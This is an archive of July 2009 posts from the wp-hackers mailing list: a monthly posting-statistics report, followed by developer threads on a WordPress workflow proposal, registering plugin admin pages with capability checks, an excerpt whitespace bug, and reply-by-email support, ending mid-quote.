From r at schestowitz.com  Wed Jul  1 06:55:58 2009
From: r at schestowitz.com (Roy Schestowitz)
Date: Wed Jul  1 06:14:02 2009
Subject: [wp-hackers] WP-Hackers Stats for June 2009
Message-ID: <4A4B087E.5050109@schestowitz.com>

  ?  Times are Greenwich Mean Time (GMT) +0:00

  ?  Statistics span a period of one month

  ?  Subject line formatted consistently "WP-Hackers Stats for <MONTH>
<YEAR>"

  ?  Killfile <subject contains "WP-Hackers Stats for "> if uninterested
____________________________________________________________


Stats for wp-hackers
~~~~~~~~~~~~~~~~~~~~
***** People who have written most messages:
+----+-----Author-----------------------------------+--Msg-+-Percent-+
|  1 | scribu gmail.com                             |   92 | 24.21 % |
|  2 | simon sweetinteraction.com                   |   26 |  6.84 % |
|  3 | lloydomattic gmail.com                       |   23 |  6.05 % |
|  4 | mikeschinkel newclarity.net                  |   22 |  5.79 % |
|  5 | autremonde75 gmail.com                       |   15 |  3.95 % |
|  6 | maillist wangstedt.net                       |   14 |  3.68 % |
|  7 | repost_08 yahoo.com                          |   14 |  3.68 % |
|  8 | lynne.pope gmail.com                         |   14 |  3.68 % |
|  9 | dan sproutventure.com                        |   13 |  3.42 % |
| 10 | jayarjo gmail.com                            |   11 |  2.89 % |
| 11 | malaiac gmail.com                            |   11 |  2.89 % |
| 12 | aaron.jorbin gmail.com                       |    9 |  2.37 % |
| 13 | somani.mayur gmail.com                       |    9 |  2.37 % |
| 14 | wp xentek.net                                |    7 |  1.84 % |
| 15 | sbruner slipfire.com                         |    6 |  1.58 % |
| 16 | joost yoast.com                              |    6 |  1.58 % |
| 17 | jake.mcmurchie googlemail.com                |    6 |  1.58 % |
| 18 | awgandrews gmail.com                         |    5 |  1.32 % |
| 19 | jer simianuprising.com                       |    5 |  1.32 % |
| 20 | niladam gmail.com                            |    5 |  1.32 % |
| 21 | peter.westwood ftwr.co.uk                    |    5 |  1.32 % |
| 22 | kelter badcat.com                            |    4 |  1.05 % |
| 23 | if.website gmail.com                         |    4 |  1.05 % |
| 24 | harish.mlists gmail.com                      |    4 |  1.05 % |
| 25 | heiko.rabe code-styling.de                   |    4 |  1.05 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |   46 | 12.11 % |
+----+----------------------------------------------+------+---------+

***** Best authors, by total size of their messages (w/o quoting):
+----+-----Author-------------------------------------------+-KBytes-+
|  1 | scribu gmail.com                                     |  108.1 |
|  2 | mikeschinkel newclarity.net                          |   28.1 |
|  3 | lloydomattic gmail.com                               |   20.7 |
|  4 | lynne.pope gmail.com                                 |   15.8 |
|  5 | simon sweetinteraction.com                           |   14.6 |
|  6 | dan sproutventure.com                                |   12.7 |
|  7 | repost_08 yahoo.com                                  |   10.4 |
|  8 | maillist wangstedt.net                               |    9.9 |
|  9 | autremonde75 gmail.com                               |    9.6 |
| 10 | jayarjo gmail.com                                    |    7.7 |
| 11 | malaiac gmail.com                                    |    7.4 |
| 12 | jer simianuprising.com                               |    6.0 |
| 13 | harish.mlists gmail.com                              |    5.4 |
| 14 | peter.westwood ftwr.co.uk                            |    4.2 |
| 15 | aaron.jorbin gmail.com                               |    3.8 |
| 16 | jake.mcmurchie googlemail.com                        |    3.7 |
| 17 | awgandrews gmail.com                                 |    3.4 |
| 18 | heiko.rabe code-styling.de                           |    3.3 |
| 19 | piemanek gmail.com                                   |    3.0 |
| 20 | sbruner slipfire.com                                 |    2.8 |
| 21 | wp xentek.net                                        |    2.8 |
| 22 | xavier borderie.net                                  |    2.8 |
| 23 | jpenney jczorkmid.net                                |    2.6 |
| 24 | joost yoast.com                                      |    2.5 |
| 25 | if.website gmail.com                                 |    2.5 |
+----+------------------------------------------------------+--------+

***** Best authors, by average size of their message (w/o quoting):
+----+-----Author--------------------------------------------+-bytes-+
|  1 | xavier borderie.net                                   |  2836 |
|  2 | casey.bisson gmail.com                                |  1807 |
|  3 | harish.mlists gmail.com                               |  1383 |
|  4 | shane bugssite.org                                    |  1383 |
|  5 | jpenney jczorkmid.net                                 |  1313 |
|  6 | mikeschinkel newclarity.net                           |  1310 |
|  7 | dougal gunters.org                                    |  1298 |
|  8 | otto ottodestruct.com                                 |  1276 |
|  9 | jer simianuprising.com                                |  1222 |
| 10 | scribu gmail.com                                      |  1202 |
| 11 | lynne.pope gmail.com                                  |  1158 |
| 12 | ozh planetozh.com                                     |  1149 |
| 13 | piemanek gmail.com                                    |  1034 |
| 14 | dan sproutventure.com                                 |  1001 |
| 15 | wpHackersList anschitech.de                           |   973 |
| 16 | lloydomattic gmail.com                                |   922 |
| 17 | andre pixelplexus.co.za                               |   900 |
| 18 | peter.westwood ftwr.co.uk                             |   857 |
| 19 | foolistbar googlemail.com                             |   847 |
| 20 | heiko.rabe code-styling.de                            |   846 |
| 21 | mpwalsh8 gmail.com                                    |   767 |
| 22 | repost_08 yahoo.com                                   |   764 |
| 23 | kikizas gmail.com                                     |   759 |
| 24 | maillist wangstedt.net                                |   724 |
| 25 | jayarjo gmail.com                                     |   716 |
+----+-------------------------------------------------------+-------+

***** Table showing the most successful subjects:
+----+----Subject-----------------------------------+--Msg-+-Percent-+
|  1 | [wp-hackers] Plugin dependency checking      |   83 | 21.84 % |
|  2 | [wp-hackers] Settings pages                  |   24 |  6.32 % |
|  3 | [wp-hackers] WordPress Plugin GUID           |   23 |  6.05 % |
|  4 | [wp-hackers] Linking stylesheet to RSS feeds |   21 |  5.53 % |
|  5 | [wp-hackers] How can I filter on post count  |   15 |  3.95 % |
|  6 | [wp-hackers] Link metadata?                  |   15 |  3.95 % |
|  7 | [wp-hackers] Custom default settings at inst |   14 |  3.68 % |
|  8 | [wp-hackers] Address and name used in notifi |   10 |  2.63 % |
|  9 | [wp-hackers] adding action to get_footer, ge |    9 |  2.37 % |
| 10 | [wp-hackers] how to integrate plugins into t |    9 |  2.37 % |
| 11 | [wp-hackers] WP 2.8 "Enhanced support for cu |    9 |  2.37 % |
| 12 | Replacing class="alignright" etc Was: Re: [w |    9 |  2.37 % |
| 13 | [wp-hackers] two wordpress's same db..       |    8 |  2.11 % |
| 14 | [wp-hackers] Searching Links                 |    7 |  1.84 % |
| 15 | [wp-hackers] Wordpress.com stats API         |    7 |  1.84 % |
| 16 | [wp-hackers] row output on wp-admin/users.ph |    7 |  1.84 % |
| 17 | [wp-hackers] Question about translation exte |    7 |  1.84 % |
| 18 | [wp-hackers] Tiny patch for plugins.php      |    6 |  1.58 % |
| 19 | [wp-hackers] Auto Add Page on Theme Select   |    6 |  1.58 % |
| 20 | [wp-hackers] WP automatic upgrade issues     |    6 |  1.58 % |
| 21 | [wp-hackers] LEFT JOIN in 2.7 to JOIN in 2.8 |    6 |  1.58 % |
| 22 | [wp-hackers] comment_form_title not working  |    5 |  1.32 % |
| 23 | [wp-hackers] Getting $sep from wp_title      |    5 |  1.32 % |
| 24 | [wp-hackers] execution of shortcode          |    5 |  1.32 % |
| 25 | [wp-hackers] 2.8, add_submenu_page and class |    5 |  1.32 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |   59 | 15.53 % |
+----+----------------------------------------------+------+---------+

***** Most used email clients:
+----+----Mailer------------------------------------+--Msg-+-Percent-+
|  1 | Google Mail/Other                            |  257 | 67.63 % |
|  2 | Apple Mail (2.935.3)                         |   54 | 14.21 % |
|  3 | Microsoft Outlook Express 6.x                |   15 |  3.95 % |
|  4 | Thunderbird 2.0.0.12 (Windows/20080213)      |   15 |  3.95 % |
|  5 | Zimbra 5.0.16_GA_2921.RHEL5_64               |   10 |  2.63 % |
|  6 | Thunderbird 2.0.0.21 (Windows/20090302)      |    6 |  1.58 % |
|  7 | iPhone Mail (5H11)                           |    4 |  1.05 % |
|  8 | Mozilla/5.x                                  |    4 |  1.05 % |
|  9 | Industrious bit-pushing elves                |    4 |  1.05 % |
| 10 | Zimbra 5.0.16_GA_2921.RHEL5_64 (Yahoo! Zimbr |    3 |  0.79 % |
| 11 | Thunderbird 2.0.0.21 (Macintosh/20090302)    |    2 |  0.53 % |
| 12 | Postbox 1.0b12 (Macintosh/2009051120)        |    2 |  0.53 % |
| 13 | INBOX.COM                                    |    1 |  0.26 % |
| 14 | Lotus Notes Release 7.0                      |    1 |  0.26 % |
| 15 | Thunderbird 2.0.0.22 (Windows/20090605)      |    1 |  0.26 % |
| 16 | Apple Mail (2.753.1)                         |    1 |  0.26 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |    0 |  0.00 % |
+----+----------------------------------------------+------+---------+

***** Table of maximal quoting:
+----+-----Author------------------------------------------+-Percent-+
|  1 | navjotjsingh gmail.com                              | 75.16 % |
|  2 | niladam gmail.com                                   | 71.88 % |
|  3 | jayminkapish inbox.com                              | 66.18 % |
|  4 | frank bueltge.de                                    | 65.17 % |
|  5 | joost yoast.com                                     | 58.31 % |
|  6 | wp-hackers striderweb.com                           | 56.35 % |
|  7 | wp xentek.net                                       | 53.67 % |
|  8 | otto ottodestruct.com                               | 52.38 % |
|  9 | nb nikolay.bg                                       | 48.93 % |
| 10 | supporto pixline.net                                | 48.20 % |
| 11 | mwalters8 gmail.com                                 | 47.47 % |
| 12 | heiko.rabe code-styling.de                          | 42.08 % |
| 13 | beau dentedreality.com.au                           | 41.10 % |
| 14 | if.website gmail.com                                | 40.48 % |
| 15 | peter.westwood ftwr.co.uk                           | 39.44 % |
| 16 | yahgrp poplarware.com                               | 38.13 % |
| 17 | casey.bisson gmail.com                              | 36.97 % |
| 18 | mikeschinkel newclarity.net                         | 36.12 % |
| 19 | admin laptoptips.ca                                 | 35.32 % |
| 20 | lynne.pope gmail.com                                | 35.27 % |
| 21 | speedboxer gmail.com                                | 34.94 % |
| 22 | dougal gunters.org                                  | 33.50 % |
| 23 | shane bugssite.org                                  | 33.15 % |
| 24 | kikizas gmail.com                                   | 30.62 % |
| 25 | ryan boren.nu                                       | 29.22 % |
+----+-----------------------------------------------------+---------+
|    | average                                             | 17.17 % |
+----+-----------------------------------------------------+---------+

***** Graph showing number of messages written during hours of day:

100% ---------------------------#--------------------- - 114
 90% ---------------------------#--------------------- msgs
 80% ---------------------------#---------------------
 70% ---------------------------#---------------------
 60% ---------------------------#---------------------
 50% ---------------------------#---------------------
 40% ---------------------------#---------------------
 30% ---------------------------#---#-------#---------
 20% ---------------------------#---#-------#-#-------
 10% ---------------------#-#---#---#---#-#-#-#-------
      * * * * * * * * * * * * * * * * * * * * * * * *
hour  0         5           11          17          23


***** Graph showing number of messages written during days of month:

100% ---------------------#----------------------------------------- - 124
 90% ---------------------#----------------------------------------- msgs
 80% ---------------------#-----------------------------------------
 70% ---------------------#-----------------------------------------
 60% ---------------------#-----------------------------------------
 50% ---------------------#-----------------------------------------
 40% ---------------------#-----------------------------------------
 30% ---------------------#-----------------------------------------
 20% -----#-----------#---#-----------------------------------------
 10% ---#-#-#-#-------#---#-------#---#-----------------------------
      * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 day  1         6           12          18          24            31


***** Graph showing number of messages written during days of week:

100% -------------#--------------- - 167
 90% -------------#--------------- msgs
 80% -------------#---------------
 70% -------------#---------------
 60% -------------#---------------
 50% -------------#---------------
 40% -------------#---------------
 30% -----#---#---#---------------
 20% -#---#---#---#---------------
 10% -#---#---#---#---#-----------
      *   *   *   *   *   *   *
     Mon Tue Wed Thu Fri Sat Sun


***** Maximal quoting:
      Author     : mikeschinkel newclarity.net
      Subject    : [wp-hackers] Re: [wp-pro] Discussion: 'Acceptable' and
      Date       : Sun, 28 Jun 2009 18:03:07 -0400
      Quote ratio: 93.86% / 5388 bytes

***** Longest message:
      Author     : lynne.pope gmail.com
      Subject    : Replacing class="alignright" etc Was: Re:
[wp-hackers] Linking
      Date       : Fri, 19 Jun 2009 19:44:21 +1200
      Size       : 5803 bytes

***** Most successful subject:
      Subject    : [wp-hackers] Plugin dependency checking
      No. of msgs: 83
      Total size : 107236 bytes

***** Final summary:
      Total number of messages:             380
      Total number of different authors:    54
      Total number of different subjects:   49
      Total size of messages (w/o headers): 401770 bytes
      Average size of a message:            1057 bytes

***** Generated by MailListStat v1.3, (C) 2001-2003 <marki (at) nexin.sk>
***** See http://freshmeat.net/projects/mls for details...

DISCLAIMER: Stats automatically produced. Remember that stats are often
meaningless and deceiving.
From otto at ottodestruct.com  Wed Jul  1 21:24:28 2009
From: otto at ottodestruct.com (Otto)
Date: Wed Jul  1 21:24:59 2009
Subject: [wp-hackers] WorkFlow in WordPress?
In-Reply-To: <-7628938594893408002@unknownmsgid>
References: <-7628938594893408002@unknownmsgid>
Message-ID: <161617690907011424h3b66cd3auafd3f8fe36297eba@mail.gmail.com>

On Thu, Jun 25, 2009 at 2:15 PM, Mike
Schinkel<mikeschinkel@newclarity.net> wrote:
> Today Simon Blackbourn emailed the list [2] about the email address and name
> used in notification messages to which Jennifer Hodgdon suggested a
> configurable option, separate from the "admin" user's email address and I
> agree with that. ?Of course adding such an option would increase the
> complexity of an install and thus I would expect the community would fight
> against such an option as if its life depended on it.

Actually, I have no problem with that one. Clearly, there's been
problems with WP installs being able to send emails in the past
because of the various from headers and such, making them easily
configurable (either via the admin menus or via filters and plugins)
is a good idea. It has been demonstrated that no one setting works for
everybody, so an option is more or less a requirement at this point.

> ?And as I write this it occurs to me that WordPress could benefit from
> essentially a checklist of "todo" items that could be added as notifications
> upon initial install. And it also occurs to me that many plugins could also
> benefit from the same, i.e. "You just installed me, now go set my options!"
>
> Akismet actually currently does this using the "admin_notices" hook and this
> hook could be used by any plugin to generate the types of notices I'm
> mentioning but doing so needs to be implicitly coupled to arbitrary data
> items, such as the Akismet API key in wp_options. But this approach isn't
> formalized and it's not standardized in any way to handle workflow so there
> are no obvious pattern for developers to follow in creating workflow and no
> "economies of scale" where numerous coding could be contributing to the same
> overall system.

I'm not quite understanding why any plugin can't hook in the same way
Akismet does and do more or less the same thing. If some setting is
not set, plugin hooks and displays a "hey, notice me!" thing.

> What I have in mind was a generic workflow system, something that could
> handle the Zensor use cases but also a while lot more. Something like adding
> a wp_workflow table to contain a list of in-process workflows with fields
> for id (int), name (varchar), type (varchar), state/status (varchar), meta
> (text, for serialized array) and probably a few other fields I haven't
> thought of yet. ?The code would include some schedule tasks that process the
> workflow queue periodically and then call hooks to process the workflow
> queue and move each workflow items from state to state as appropriate. It
> would also include various helper functions to streamline the process of
> using the workflow system. By itself this plugin/functionality would do very
> little for end users; it would only be something that other plugins or even
> core could use to implement workflows.

I don't quite follow what you mean by "workflows", as such. I'm
opposed to adding a new table specifically for them without some kind
of better explanation as to what you're talking about. Let's try a
question and answer format:

1. What is a workflow?
2. How does it work?
3. What does a row in this table represent?
4. What can a workflow do that you cannot do already with existing
functionality?
5. How could the core benefit from workflows (leaving out what plugins
can do entirely)?

Generally speaking, I've noticed "generalized" type of things tend to
make it into core when they can specifically improve the core itself,
and then they become available for plugins. Very rarely do you see
things get in so that plugins can use them. Example: SimplePie
recently replaced MagpieRSS in the core. Why? Because the new
dashboard makes a lot more extensive use of feeds, and Magpie didn't
cut the mustard anymore. This despite that fact that many people have
been wanting SimplePie in for a couple years now, so that they would
have a decent RSS parser in there to use.


-Otto
From mikeschinkel at newclarity.net  Wed Jul  1 23:18:55 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed Jul  1 23:19:38 2009
Subject: [wp-hackers] WorkFlow in WordPress?
In-Reply-To: <23855560.141246489940762.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <11642784.161246490337657.JavaMail.DELL-1405$@Dell-1405>

"Otto" <otto@ottodestruct.com> wrote:
> Actually, I have no problem with that one. 

If "the powers that be" think it makes sense to add it, I've no argument.

> I'm not quite understanding why any plugin can't hook in 
> the same way Akismet does and do more or less the same 
> thing. If some setting is not set, plugin hooks and displays 
> a "hey, notice me!" thing.

Certainly a plugin can, the difference I was suggesting would be to have standardized infrastructure to do it much like there is standardized infrastructure for categories so that any plugins needing workflow could do in a standardized way rather than arbitrarily different ways.

BTW, scan or read my entire email before commenting to first see my closing comments.

> I don't quite follow what you mean by "workflows", as such. 
> 1. What is a workflow?

A workflow is a mapping of states and transitions, some potentially automated and some potentially manual that collectively are used to manage a process.

These might help: 

  http://en.wikipedia.org/wiki/Workflow
  http://drupal.org/project/workflow
  http://www.theserverside.com/tt/articles/article.tss?l=Workflow

> 2. How does it work?
> 3. What does a row in this table represent?

The table I proposed would be used to store workflow "states" such as "Post Awaiting Review by Moderator" or "Product Submitted awaiting Review."  This might help you understanding workflow states:

  http://www.odetocode.com/articles/460.aspx

Then a scheduled task would monitor workflow in the background and run plugin code that has hooked the workflow system to move workflow items from one state to the next.

> 4. What can a workflow do that you cannot do already with existing functionality?

Let me answer by asking a rhetorical question: Is there anything a plugin can do that a theme could not do? Not really, so why did we need plugins when we could just do them in themes?  Clearly the plugin concept *standardizes* an approach to extensions so that functionality need not be copied into themes.

A standardized approach to workflow would mean collaboration among developers on a common workflow system. It could create a platform whereby end users could add and/or modify workflow just like end users currently and plugins. The reason to argue for a standard workflow system is the same reason anyone argues for any standard; compatibility and ubiquity.  

> 5. How could the core benefit from workflows (leaving out 
what plugins can do entirely)?

One example would be the item I already mentioned; to notify the user they need to update "wordpress@mydomain.com" after installation.  Another could be to set up rules moderating posts and comments allowing people with different roles to moderate differently.  Another could be to establish a process for publishing posts for a big blog: writer writes, editor reviews, categorizer categorizes, photo editor adds photos, etc.  

All of these examples could allow the admin to control any workflow based on business needs using admin console functionality and w/o programming (assuming the only state transitions that are needed are available in core or via plugins.)

> Generally speaking, I've noticed "generalized" type of things 
> tend to make it into core when they can specifically improve 
> the core itself, and then they become available for plugins. 

100% agreed with that. This workflow could easily be done in a plugin w/o the need to be part of core. My only reason for mentioning core is I think it could significantly benefit core as a standard component of functionality.

THAT said, given the admin email vs. the blog email isn't an urgency demanding workflow, I can easily build it as a plugin for my own needs and over time, if and only if it proves to be a useful addition to the core it can be added to core.  

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins
From alex at dunae.ca  Fri Jul  3 17:24:01 2009
From: alex at dunae.ca (Alex Dunae)
Date: Fri Jul  3 17:24:15 2009
Subject: [wp-hackers] Working with $_registered_pages for plugins
Message-ID: <778d0e4f-f6f5-4475-95e8-2c543d76fe52@y4g2000prf.googlegroups.com>

Ryan recently updated /wp-admin/includes/plugins.php so that it checks
plugin pages (?page=...) against $_registered_pages before executing
(http://core.trac.wordpress.org/changeset/11595 and
http://core.trac.wordpress.org/changeset/11596).

I have a plugin that needs to run a specific file (smush.php?
attachment_ID=n) but it doesn't make sense for it to appear in any of
the admin menus.

So far, the best workaround is to add the following to `admin_menu`:

	$hookname = get_plugin_page_hookname( $plugin_file . '/smush.php',
'' );
	$_registered_pages[$hookname] = true;

Doesn't seem very proper, though.

Is there a proper way to add a page to the $_registered_pages array
without having it appear as a menu item?

Alex
From ryan at boren.nu  Fri Jul  3 19:01:55 2009
From: ryan at boren.nu (Ryan Boren)
Date: Fri Jul  3 19:02:08 2009
Subject: [wp-hackers] Working with $_registered_pages for plugins
In-Reply-To: <778d0e4f-f6f5-4475-95e8-2c543d76fe52@y4g2000prf.googlegroups.com>
References: <778d0e4f-f6f5-4475-95e8-2c543d76fe52@y4g2000prf.googlegroups.com>
Message-ID: <c8f37c930907031201ja8beb1i4b16187dda0ce5c2@mail.gmail.com>

On Fri, Jul 3, 2009 at 10:24 AM, Alex Dunae<alex@dunae.ca> wrote:
> Ryan recently updated /wp-admin/includes/plugins.php so that it checks
> plugin pages (?page=...) against $_registered_pages before executing
> (http://core.trac.wordpress.org/changeset/11595 and
> http://core.trac.wordpress.org/changeset/11596).
>
> I have a plugin that needs to run a specific file (smush.php?
> attachment_ID=n) but it doesn't make sense for it to appear in any of
> the admin menus.
>
> So far, the best workaround is to add the following to `admin_menu`:
>
> ? ? ? ?$hookname = get_plugin_page_hookname( $plugin_file . '/smush.php',
> '' );
> ? ? ? ?$_registered_pages[$hookname] = true;
>
> Doesn't seem very proper, though.
>
> Is there a proper way to add a page to the $_registered_pages array
> without having it appear as a menu item?

Just add a current_user_can() check to it. That's what all plugins
should be doing anyway.  Don't rely on the menu cap check for
security.
From peter.westwood at ftwr.co.uk  Fri Jul  3 21:15:33 2009
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri Jul  3 21:15:48 2009
Subject: [wp-hackers] Working with $_registered_pages for plugins
In-Reply-To: <c8f37c930907031201ja8beb1i4b16187dda0ce5c2@mail.gmail.com>
References: <778d0e4f-f6f5-4475-95e8-2c543d76fe52@y4g2000prf.googlegroups.com>
	<c8f37c930907031201ja8beb1i4b16187dda0ce5c2@mail.gmail.com>
Message-ID: <24383733-4CB8-4A6A-B1DE-0E760EB00BDE@ftwr.co.uk>


On 3 Jul 2009, at 20:01, Ryan Boren wrote:

> On Fri, Jul 3, 2009 at 10:24 AM, Alex Dunae<alex@dunae.ca> wrote:
>> Ryan recently updated /wp-admin/includes/plugins.php so that it  
>> checks
>> plugin pages (?page=...) against $_registered_pages before executing
>> (http://core.trac.wordpress.org/changeset/11595 and
>> http://core.trac.wordpress.org/changeset/11596).
>>
>> I have a plugin that needs to run a specific file (smush.php?
>> attachment_ID=n) but it doesn't make sense for it to appear in any of
>> the admin menus.
>>
>> So far, the best workaround is to add the following to `admin_menu`:
>>
>>        $hookname = get_plugin_page_hookname( $plugin_file . '/ 
>> smush.php',
>> '' );
>>        $_registered_pages[$hookname] = true;
>>
>> Doesn't seem very proper, though.
>>
>> Is there a proper way to add a page to the $_registered_pages array
>> without having it appear as a menu item?
>
> Just add a current_user_can() check to it. That's what all plugins
> should be doing anyway.  Don't rely on the menu cap check for
> security.

I wouldn't recommend messing with the $_registered_pages array it's  
better to work with the API rather than hacking around it - your  
plugin is more likely to be past and future proof.

I assume you have a plugin page registered as a menu item.

You could add an extra query var which triggered the special action  
and pass it to that page.

And don't forget that page should always have a current_user_can() cap  
check for whatever capabilities are required to use it.

westi
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5

From alex at dunae.ca  Fri Jul  3 22:49:03 2009
From: alex at dunae.ca (Alex)
Date: Fri Jul  3 22:49:40 2009
Subject: [wp-hackers] Re: Working with $_registered_pages for plugins
In-Reply-To: <24383733-4CB8-4A6A-B1DE-0E760EB00BDE@ftwr.co.uk>
References: <778d0e4f-f6f5-4475-95e8-2c543d76fe52@y4g2000prf.googlegroups.com>
	<c8f37c930907031201ja8beb1i4b16187dda0ce5c2@mail.gmail.com> 
	<24383733-4CB8-4A6A-B1DE-0E760EB00BDE@ftwr.co.uk>
Message-ID: <4864a78d-0afb-4e41-a102-72f6267e161a@x1g2000prh.googlegroups.com>

On 3 Jul 2009, at 20:01, Ryan Boren wrote:
> > Just add a current_user_can() check to it. That's what all plugins
> > should be doing anyway. ?Don't rely on the menu cap check for
> > security.

I was actually having the opposite problem -- I was actually getting
permission denied errors from wp_die().

On Jul 3, 2:15 pm, Peter Westwood <peter.westw...@ftwr.co.uk> wrote:
>
> I assume you have a plugin page registered as a menu item.
>
> You could add an extra query var which triggered the special action ?
> and pass it to that page.
>

That did it, thanks westi.  Much appreciated.

From ryan at boren.nu  Fri Jul  3 23:50:19 2009
From: ryan at boren.nu (Ryan Boren)
Date: Fri Jul  3 23:50:29 2009
Subject: [wp-hackers] Re: Working with $_registered_pages for plugins
In-Reply-To: <4864a78d-0afb-4e41-a102-72f6267e161a@x1g2000prh.googlegroups.com>
References: <778d0e4f-f6f5-4475-95e8-2c543d76fe52@y4g2000prf.googlegroups.com>
	<c8f37c930907031201ja8beb1i4b16187dda0ce5c2@mail.gmail.com>
	<24383733-4CB8-4A6A-B1DE-0E760EB00BDE@ftwr.co.uk>
	<4864a78d-0afb-4e41-a102-72f6267e161a@x1g2000prh.googlegroups.com>
Message-ID: <c8f37c930907031650m7a08a7c3re1d8f2ea6086e2c0@mail.gmail.com>

On Fri, Jul 3, 2009 at 3:49 PM, Alex<alex@dunae.ca> wrote:
> On 3 Jul 2009, at 20:01, Ryan Boren wrote:
>> > Just add a current_user_can() check to it. That's what all plugins
>> > should be doing anyway. ?Don't rely on the menu cap check for
>> > security.
>
> I was actually having the opposite problem -- I was actually getting
> permission denied errors from wp_die().

Ah, okay.

> On Jul 3, 2:15 pm, Peter Westwood <peter.westw...@ftwr.co.uk> wrote:
>>
>> I assume you have a plugin page registered as a menu item.
>>
>> You could add an extra query var which triggered the special action
>> and pass it to that page.
>>
>
> That did it, thanks westi. ?Much appreciated.

You can also do this:

admin.php?action=my_action

And then hook to 'admin_action_my_action'.

Or, admin-post.php?action=my_action and hook onto 'admin_post_my_action'.

Or, admin-ajax.php?action=my_action and hook onto 'wp_ajax_my_action'.

You have to do your own permission checks inside any handlers you attach.
From alex at dunae.ca  Mon Jul  6 23:57:10 2009
From: alex at dunae.ca (Alex)
Date: Mon, 6 Jul 2009 16:57:10 -0700 (PDT)
Subject: [wp-hackers] Working with $_registered_pages for plugins
In-Reply-To: <c8f37c930907031650m7a08a7c3re1d8f2ea6086e2c0@mail.gmail.com>
References: <778d0e4f-f6f5-4475-95e8-2c543d76fe52@y4g2000prf.googlegroups.com>
	<c8f37c930907031201ja8beb1i4b16187dda0ce5c2@mail.gmail.com> 
	<24383733-4CB8-4A6A-B1DE-0E760EB00BDE@ftwr.co.uk>
	<4864a78d-0afb-4e41-a102-72f6267e161a@x1g2000prh.googlegroups.com>
	<c8f37c930907031650m7a08a7c3re1d8f2ea6086e2c0@mail.gmail.com>
Message-ID: <3d08dcf0-5520-4d02-9a67-df54f60f1f22@d9g2000prh.googlegroups.com>

On Jul 3, 4:50?pm, Ryan Boren <r... at boren.nu> wrote:
> You can also do this:
>
> admin.php?action=my_action

That's exactly what I was looking for.  Thank you.

Alex

From sojweb at indiana.edu  Fri Jul 10 13:33:45 2009
From: sojweb at indiana.edu (SoJ Web)
Date: Fri, 10 Jul 2009 09:33:45 -0400
Subject: [wp-hackers] White space and the_excerpt
Message-ID: <32AB7C85-9FDF-4D74-8B35-536E3B121718@indiana.edu>

In case anyone else has happened across this:

I recently ran into a problem with the_excerpt(), where it would just  
output white space. It turned out that the posts it was doing that on  
had a bunch of HTML at the beginning, and when wp_trim_excerpt() ran,  
it was stripping the HTML tags, but leaving the surrounding white  
space. When it then pulled the first 55 words of the post content, it  
was all white space. To work around, I just put in some regex to  
collapse the white space before the excerpt was generated. Fix is  
here: http://core.trac.wordpress.org/ticket/10376


-Jeff Johnson

From johnbillion+wp at gmail.com  Fri Jul 10 13:40:14 2009
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Fri, 10 Jul 2009 14:40:14 +0100
Subject: [wp-hackers] White space and the_excerpt
In-Reply-To: <32AB7C85-9FDF-4D74-8B35-536E3B121718@indiana.edu>
References: <32AB7C85-9FDF-4D74-8B35-536E3B121718@indiana.edu>
Message-ID: <1fa535a70907100640v68e5952dq1b4367d92491d588@mail.gmail.com>

Nice catch Jeff.

2009/7/10 SoJ Web <sojweb at indiana.edu>:
> In case anyone else has happened across this:
>
> I recently ran into a problem with the_excerpt(), where it would just output
> white space. It turned out that the posts it was doing that on had a bunch
> of HTML at the beginning, and when wp_trim_excerpt() ran, it was stripping
> the HTML tags, but leaving the surrounding white space. When it then pulled
> the first 55 words of the post content, it was all white space. To work
> around, I just put in some regex to collapse the white space before the
> excerpt was generated. Fix is here:
> http://core.trac.wordpress.org/ticket/10376
>
>
> -Jeff Johnson
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From cpoteet at siolon.com  Mon Jul 13 14:34:55 2009
From: cpoteet at siolon.com (Chris Poteet)
Date: Mon, 13 Jul 2009 07:34:55 -0700 (PDT)
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
Message-ID: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>

Is there a plan to implement this in the self hosted version?

http://en.blog.wordpress.com/2009/04/23/comment-reply-via-email-open-to-all/

From joseph at josephscott.org  Mon Jul 13 15:40:19 2009
From: joseph at josephscott.org (Joseph Scott)
Date: Mon, 13 Jul 2009 09:40:19 -0600
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
Message-ID: <1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>


On Jul 13, 2009, at 8:34 AM, Chris Poteet wrote:

> Is there a plan to implement this in the self hosted version?
>
> http://en.blog.wordpress.com/2009/04/23/comment-reply-via-email-open-to-all/


Not currently.  Users would need some ability to manage email aliases,  
pipe email to PHP script, etc.  Not out of the question, just not as  
easy as setting up WP.

--
Joseph Scott
joseph at josephscott.org
http://josephscott.org/





From speedboxer at gmail.com  Tue Jul 14 01:47:52 2009
From: speedboxer at gmail.com (Matt Freedman)
Date: Mon, 13 Jul 2009 18:47:52 -0700
Subject: [wp-hackers] Reply By Email in Self Hosted Blogs
In-Reply-To: <1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
References: <81eab60e-02d1-4032-b40d-048d74bcf837@r36g2000vbn.googlegroups.com>
	<1A7CDBB8-E715-4E6D-B02D-C27D2A26F39B@josephscott.org>
Message-ID: <b88434820907131847x1a035134p313a50c37abb52fa@mail.gmail.com>

What about releasing the source code, so at least more advanced users
could set it up?


On Mon, Jul 13, 2009 at 8:40 AM, Joseph Scott<joseph at josephscott.org> wrote:
>
> On Jul 13, 2009, at 8:34 AM, Chris Poteet wrote:
>
>> Is there a plan to implement this in the self hosted version?
>>
>>
